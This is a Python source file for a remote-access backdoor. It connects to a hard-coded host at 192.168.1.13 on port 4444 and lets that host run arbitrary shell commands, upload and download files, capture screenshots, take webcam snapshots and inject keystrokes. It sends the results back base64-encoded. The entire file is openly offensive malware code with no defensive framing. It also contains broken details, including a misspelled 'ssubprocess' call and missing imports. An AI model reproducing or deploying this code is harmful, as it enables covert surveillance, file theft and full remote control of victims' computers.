#!python3
# -*- encoding: utf-8 -*-

import socket
import sys
import base64 
import os
import json
import StringIO 
import subprocess
import PIL
import cv2

extensions = [
    '.txt', '.aif', '.cda', '.mid', '.mp3', '.mpa', '.ogg', '.wav', '.wma', '.wpl',
    '.zip', '.7z', '.arj', '.deb', '.pkg', '.rar', '.rpm', '.gz', '.z', '.zip', 
    '.bin', '.dmg', '.iso', '.toast', '.vcd', '.csv', '.dat','.db', '.log', '.mdb',
    '.sav', '.sql', '.tar', '.xml', '.exe', '.apk', '.bat', '.bin', '.cgi', '.com', 
    '.exe', '.gadget', '.jar', '.py', '.wsf', '.fnt', '.fon', '.otf', '.ttf', '.ai',
    '.bmp', '.gif', '.ico', '.jpeg', '.png', '.ps', '.psd', '.svg', '.tif', '.asp',
    '.cer', '.cfm', '.cgi', '.css', '.htm', '.js', '.jsp', '.part', '.php', '.py',
    '.rss', '.xhtml', '.key', '.odp', '.pps', '.ppt', '.pptx', '.c', '.class', '.cpp',
    '.cs', '.h', '.java', '.sh', '.swift', '.vb', '.ods', '.xlr', '.xls', '.xlsx',
    '.bak', '.cab', '.cfg', '.cpl', '.cur', '.dll', '.dmp', '.drv', '.icns', '.ico',
    '.ini', '.lnk', '.msi', '.sys', '.tmp', '.3g2', '.3gp', '.avi', '.flv', '.h264'
    '.m4v', '.mkv', '.mov', '.mp4', '.mpg', '.rm', '.swf', '.vob', '.wmv', '.doc',
    '.odt', '.pdf', '.rtf', '.tex', '.txt', '.wks', '.wpd', '.html'
]

class Tools:
    def __init__(self, connection):
        self.connection = connection
        self.log = ""

    def screenshot(self):
        """ Take the screenshot and return data base64_encoded"""
        frame = PIL.ImageGrab.grab()
        
        mem_file = StringIO.StringIO()
        frame.save(mem_file, "jpeg")
        return base64.b64encode(mem_file.getvalue())

    def snap(self):
        """ Take snapshot using webcam and return data base64_encoded """
        try:
            frame = cv2.VideoCapture(0)
        except Exception:
            frame = cv2.VideoCapture(1)
        is_available, picture = frame.read()
        if is_available:
            gray_image = cv2.cvtColor(picture, cv2.COLOR_BGR2GRAY)
            im = Image.fromarray(gray_image)
            mem_file = StringIO.StringIO()
            im.save(mem_file, "jpeg")
            return base64.b64encode(mem_file.getvalue())
        return "### Snap Faileda ###"

    def chdir(self, command):
        location = command[1]
        if len(command) > 2:
            location = (" ").join(command[1:])
        os.chdir(location)
        result = "Changing Dir > {}".format(location)                        

class BD:
    def __init__(self, ip, port):
        try:    
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((ip, port))
            self.sp = Tools(self.connection)
        except socket.error:
            sys.exit()

        super().__init__(self.connection)

    def receive_data(self):
        """ Receive a data using json """
        data = ""
        while True:
            try:
                data = data + self.connection.recv(1024)
                return json.loads(data)
            except ValueError:
                continue

    def send_data(self, content):
        """ Send data using json """
        data = json.dumps(content)
        self.connection.send(data)

    def read_file(self, path):
        """ Read file located in path """
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, name, data):
        """ Write file with file name and data """
        with open(name, "wb") as file:
            file.write(base64.b64decode(data))
        return "*** {} Uploaded ***".format(name) 

    def run(self):
        """ Run the backdoor and check every command """
        while True:
            try:
                command = self.receive_data()
                if command[0] == "exit":   
                    self.send_data("exit")  
                    self.connection.close()
                    sys.exit()              
                elif command[0] == "more": 
                    with open(command[1]) as file:
                        result = base64.b64encode(file.read())
                elif any([command[0].endswith(x) for x in extensions]): 
                    try:
                        ssubprocess.Popen(command[0], shell=True)
                        continue
                    except Exception as error:
                        result = "### File Open Error: {} ###".format(error)
                elif command[0] == "cd":  
                    result = self.sp.chdir(command)
                elif command[0] == "hotkey":
                    pyautogui.hotkey(*command[1:])
                elif command[0] == "screenshot":
                    result = self.sp.screenshot()
                elif command[0] == "snap":
                    result = self.sp.snap()
                elif command[0].lower() == "upload":
                    result = self.write_file(command[1], command[2])
                elif command[0].lower() == "download":
                    result = self.read_file(command[1])         
                else:
                    result = subprocess.check_output(command, shell=True)
            except Exception as error:
                result = "### Error ###: {}".format(error)
            self.send_data(result)

bd = BD("192.168.1.13", 4444)
bd.run()